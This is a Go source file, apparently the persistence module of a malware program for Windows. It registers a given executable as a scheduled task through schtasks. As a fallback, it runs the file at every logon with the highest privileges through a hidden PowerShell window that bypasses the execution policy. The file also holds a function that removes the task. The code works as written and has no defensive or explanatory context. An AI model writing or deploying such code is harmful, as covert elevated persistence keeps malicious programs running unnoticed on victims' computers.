package persistence

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/horobimasu/gotils"
)

//go:embed schedular.xml
var schedularXML string

func AddToScheduler(filePath string) error {
	xmlData := strings.ReplaceAll(schedularXML, "%THE_CMD%", filePath)
	xmlData = strings.ReplaceAll(xmlData, "%THE_NAME%", getPersistenceName(_PERSISTENCE_NAME_SCHEDULER))

	xmlPath := filepath.Join(os.TempDir(), fmt.Sprintf("%d.xml", time.Now().UnixNano()))

	err := os.WriteFile(xmlPath, []byte(xmlData), 0666)
	if err == nil {
		defer os.Remove(xmlPath)

		err := gotils.RunCommand(
			"schtasks", "/create",
			"/tn", getPersistenceName(_PERSISTENCE_NAME_SCHEDULER),
			"/xml", xmlPath,
			"/f",
		)

		if err != nil {
			return err
		}
	} else {
		command := fmt.Sprintf(
			"powershell -nop -w hidden -ep bypass -c \"& '%s'\"",
			filePath,
		)

		err := gotils.RunCommand(
			"schtasks", "/create",
			"/tn", getPersistenceName(_PERSISTENCE_NAME_SCHEDULER),
			"/tr", command,
			"/sc", "ONLOGON",
			"/rl", "HIGHEST",
			"/it", "/f",
		)

		if err != nil {
			return err
		}
	}

	return nil
}

func RemoveFromScheduler() error {
	return gotils.RunCommand(
		"schtasks", "/delete",
		"/tn", getPersistenceName(_PERSISTENCE_NAME_SCHEDULER),
		"/f",
	)
}
